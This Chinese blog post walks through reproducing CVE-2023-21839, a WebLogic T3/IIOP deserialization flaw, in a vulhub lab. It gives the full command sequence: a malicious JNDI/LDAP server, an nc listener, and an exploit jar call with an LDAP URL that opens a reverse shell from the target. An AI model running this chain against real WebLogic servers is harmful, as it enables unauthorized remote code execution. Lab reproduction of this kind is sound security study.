# CVE-2023-21839 漏洞复现（Weblogic T3/IIOP 反序列化命令执行漏洞） - Jarwu - 博客园

> 原文：[`www.cnblogs.com/jarwu/p/17161350.html`](https://www.cnblogs.com/jarwu/p/17161350.html)

# 0x01 简单介绍

CVE-2023-21839 允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞

# 0x02 复现环境

[vulhub](https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2023-21839/docker-compose.yml)

weblogic:12.2.1.3

# 0x03 工具准备

JNDIExploit-1.4-SNAPSHOT.jar
Weblogic-CVE-2023-21839.jar

# 0x04 复现过程

启动环境

```
docker-compose up -d 
```

启动 ldap 服务

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.148.1 
```

kali 上准备 nc 监听（windows 上没装 nc）

```
nc -lvnp 9999 
```

使用反弹 shell 的方式攻击

```
java -jar Weblogic-CVE-2023-21839.jar 192.168.148.129:7001 ldap://192.168.148.1:1389/Basic/ReverseShell/192.168.148.129/9999 
```

获得 shell

![image](img/e71d17cc753823a43cfe8e9fb9c258d5.png)

# 0xFF 参考文章

[`github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839`](https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839)
[`www.ddosi.org/cve-2023-21839/`](https://www.ddosi.org/cve-2023-21839/)
[`cve.report/CVE-2023-21839`](https://cve.report/CVE-2023-21839)